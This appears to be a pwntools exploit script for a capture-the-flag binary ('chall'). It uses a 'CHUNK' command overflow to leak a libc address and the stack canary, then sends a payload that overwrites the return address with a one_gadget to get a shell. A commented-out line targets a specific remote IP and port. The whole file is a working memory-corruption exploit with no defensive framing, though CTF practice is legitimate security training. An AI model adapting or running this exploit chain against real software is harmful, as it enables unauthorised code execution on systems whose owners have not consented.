from pwn import *

# p = remote('34.45.81.67', 16006)
p = process('./wrapper.sh')
elf = ELF('./chall')
# context.log_level ='debug'
libc = ELF('./libc.so.6')

# [1] libc leak
p.sendline(b'CHUNKS 3')
payload = b"CHUNK 0 1 " + b'a'*0x3f # overflow offset of libc 
p.sendline(payload)
p.recvuntil(b'aaaaa\n')
leak = u64(p.recv(6)+b'\x00\x00')
libc_base = leak + 0x940 
# libc_base = leak + 0x940 # localìš©
print(f"libcbase: {hex(libc_base)}")


# [2] canary leak
payload = b"CHUNK 1000 1 " + b'b'*0x48 # overflow offset of canary # not to exit program , set timeout 100
p.sendline(payload)
p.recvuntil(b'b\n')
canary = u64(b'\x00' + p.recv(7))
print(f"canary : {hex(canary)}")


# [3] ROP 
one_gadget = libc_base + 0x583ec
payload = b'CHUNK 0 1 ' + b'c'*0x48 + p64(canary) + b'd'*0x8 + p64(one_gadget)
p.send(payload)

p.interactive()